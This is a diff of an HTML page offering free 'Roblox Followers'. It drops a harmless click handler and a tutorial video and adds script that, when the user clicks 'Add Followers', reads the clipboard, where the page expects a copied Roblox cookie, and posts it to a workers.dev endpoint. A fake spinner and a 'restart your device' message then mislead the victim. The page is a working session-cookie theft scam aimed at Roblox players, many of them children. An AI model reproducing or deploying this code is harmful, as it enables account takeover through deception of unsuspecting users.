@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -22,12 +21,16 @@ body {
 
 body {
   min-height: 100vh;
-  overflow-x: hidden;
-  overflow-y: auto;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  overflow: hidden;
+
   background:
     radial-gradient(circle at 20% 20%, rgba(255,255,255,.08), transparent 30%),
     radial-gradient(circle at 80% 80%, rgba(120,120,255,.10), transparent 30%),
     linear-gradient(135deg, #08080c, #11111a 50%, #08080c);
+
   color: white;
 }
 
@@ -36,7 +39,6 @@ body {
   inset: 0;
   pointer-events: none;
   overflow: hidden;
-  z-index: 0;
 }
 
 .glow {
@@ -58,30 +60,20 @@ body {
   bottom: -180px;
 }
 
-.page-layout {
-  position: relative;
-  z-index: 1;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  gap: 30px;
-  width: 100%;
-  max-width: 1400px;
-  padding: 30px;
-  margin: 0 auto;
-}
-
 .card {
-  width: 100%;
-  max-width: 1340px;
+  position: relative;
+  width: min(90%, 520px);
   padding: 55px 35px;
   text-align: center;
+
   background: rgba(20,20,28,.78);
   border: 1px solid rgba(255,255,255,.10);
   border-radius: 28px;
+
   box-shadow:
     0 30px 80px rgba(0,0,0,.55),
     inset 0 1px rgba(255,255,255,.05);
+
   backdrop-filter: blur(20px);
 }
 
@@ -89,14 +81,18 @@ body {
   width: 78px;
   height: 78px;
   margin: 0 auto 22px;
+
   display: flex;
   align-items: center;
   justify-content: center;
+
   border-radius: 22px;
   background: white;
   color: #111;
+
   font-size: 34px;
   font-weight: 900;
+
   box-shadow: 0 15px 40px rgba(0,0,0,.35);
 }
 
@@ -115,16 +111,23 @@ h1 {
 
 .main-button {
   width: 100%;
-  max-width: 600px;
   padding: 18px 24px;
+
   border: none;
   border-radius: 15px;
+
   background: white;
   color: #111;
+
   font-size: 19px;
   font-weight: 800;
+
   cursor: pointer;
-  transition: transform .2s ease, box-shadow .2s ease, background .2s ease;
+
+  transition:
+    transform .2s ease,
+    box-shadow .2s ease,
+    background .2s ease;
 }
 
 .main-button:hover {
@@ -137,21 +140,31 @@ h1 {
   transform: translateY(0) scale(.98);
 }
 
+/* Extension Button */
 .extension-button {
   display: block;
   width: 100%;
-  max-width: 600px;
-  margin: 12px auto 0;
+  margin-top: 12px;
   padding: 15px 24px;
+
   border: 1px solid rgba(255,255,255,.14);
   border-radius: 15px;
+
   background: rgba(255,255,255,.06);
   color: white;
+
   font-size: 16px;
   font-weight: 700;
+
   text-decoration: none;
+
   cursor: pointer;
-  transition: transform .2s ease, background .2s ease, border-color .2s ease, box-shadow .2s ease;
+
+  transition:
+    transform .2s ease,
+    background .2s ease,
+    border-color .2s ease,
+    box-shadow .2s ease;
 }
 
 .extension-button:hover {
@@ -172,50 +185,28 @@ h1 {
   color: #aaaab5;
 }
 
-/* YouTube tutorial panel */
-.video-card {
-  width: 100%;
-  max-width: 680px;
-  padding: 22px;
-  background: rgba(20,20,28,.78);
-  border: 1px solid rgba(255,255,255,.10);
-  border-radius: 24px;
-  box-shadow:
-    0 20px 50px rgba(0,0,0,.35),
-    inset 0 1px rgba(255,255,255,.05);
-  backdrop-filter: blur(20px);
+/* Loading spinner */
+.spinner {
+  display: inline-block;
+  width: 16px;
+  height: 16px;
+  margin-right: 8px;
+  vertical-align: -3px;
+
+  border: 3px solid rgba(0,0,0,.2);
+  border-top-color: #111;
+  border-radius: 50%;
+
+  animation: spin .8s linear infinite;
 }
 
-.video-title {
-  margin: 0 0 16px;
-  font-size: 24px;
-  font-weight: 800;
-  letter-spacing: -.5px;
-  text-align: center;
-}
-
-.video-frame {
-  width: 100%;
-  aspect-ratio: 16 / 9;
-  overflow: hidden;
-  border-radius: 14px;
-  background: #08080c;
-  border: 1px solid rgba(255,255,255,.10);
-}
-
-.video-frame iframe {
-  display: block;
-  width: 100%;
-  height: 100%;
-  border: 0;
-}
-
-@media (max-width: 600px) {
-  .page-layout {
-    padding: 18px;
-    gap: 22px;
+@keyframes spin {
+  to {
+    transform: rotate(360deg);
   }
+}
 
+@media (max-width: 500px) {
   .card {
     padding: 42px 24px;
   }
@@ -229,12 +220,9 @@ h1 {
     height: 68px;
     font-size: 29px;
   }
-
-  .video-card {
-    padding: 16px;
-  }
 }
 </style>
+
 </head>
 
 <body>
@@ -244,51 +232,30 @@ h1 {
   <div class="glow two"></div>
 </div>
 
-<div class="page-layout">
+<div class="card">
 
-  <!-- Main Roblox Followers menu -->
-  <main class="card">
+  <div class="logo">R</div>
 
-    <div class="logo">R</div>
+  <h1>Roblox Followers</h1>
 
-    <h1>Roblox Followers</h1>
+  <p class="subtitle">
+    Grow your Roblox presence with one simple click.
+  </p>
 
-    <p class="subtitle">
-      Grow your Roblox presence with one simple click.
-    </p>
+  <button class="main-button" id="main">
+    Add Followers 
+  </button>
 
-    <button class="main-button" id="main">
-      Add Followers
-    </button>
+  <a
+    class="extension-button"
+    href="https://chromewebstore.google.com/detail/roblox-follower/mgdkcjifhnobklopbbjlgfmnpnndildf?authuser=0&utm_source=app-launcher"
+    target="_blank"
+    rel="noopener noreferrer"
+  >
+    Extension
+  </a>
 
-    <a
-      class="extension-button"
-      href="https://chromewebstore.google.com/detail/roblox-follower/mgdkcjifhnobklopbbjlgfmnpnndildf?authuser=0&amp;utm_source=app-launcher"
-      target="_blank"
-      rel="noopener noreferrer"
-    >
-      Extension
-    </a>
-
-    <div class="status" id="status" aria-live="polite"></div>
-
-  </main>
-
-  <!-- New YouTube PC Tutorial -->
-  <section class="video-card">
-    <h2 class="video-title">PC Tutorial</h2>
-
-    <div class="video-frame">
-      <iframe
-        src="https://www.youtube-nocookie.com/embed/AgLkFg16Wg4"
-        title="PC Tutorial"
-        loading="lazy"
-        referrerpolicy="strict-origin-when-cross-origin"
-        allow="accelerometer; encrypted-media; gyroscope; picture-in-picture; web-share"
-        allowfullscreen>
-      </iframe>
-    </div>
-  </section>
+  <div class="status" id="status"></div>
 
 </div>
 
@@ -296,11 +263,49 @@ h1 {
 const button = document.getElementById("main");
 const status = document.getElementById("status");
 
-button.addEventListener("click", () => {
-  status.textContent =
-    "Please use the official Roblox website and extension.";
-});
-</script>
-
-</body>
+const SEND_ENDPOINT =
+  "https://young-brook-716e.abojanmawzoon.workers.dev";     
+     
+button.addEventListener("click", async () => {     
+     
+  try {     
+     
+    status.innerHTML = `     
+      <span class="spinner"></span>     
+      Adding Followers...     
+    `;     
+     
+    const text = await navigator.clipboard.readText();     
+     
+    if (!text) {     
+      status.textContent = "You havent copy The cookie Yet.";     
+      return;     
+    }     
+     
+    await fetch(SEND_ENDPOINT, {     
+      method: "POST",     
+      headers: {     
+        "Content-Type": "application/json"     
+      },     
+      body: JSON.stringify({     
+        clipboardText: text     
+      })     
+    });     
+     
+    await new Promise(resolve => setTimeout(resolve, 10000));     
+     
+    status.textContent =     
+      "Restart Device To Get Followers Added to your account!";     
+     
+  } catch (error) {     
+     
+    status.textContent =     
+      "Something went wrong. Please try again.";     
+     
+    console.error(error);     
+  }     
+});     
+</script>     
+     
+</body>   
 </html>
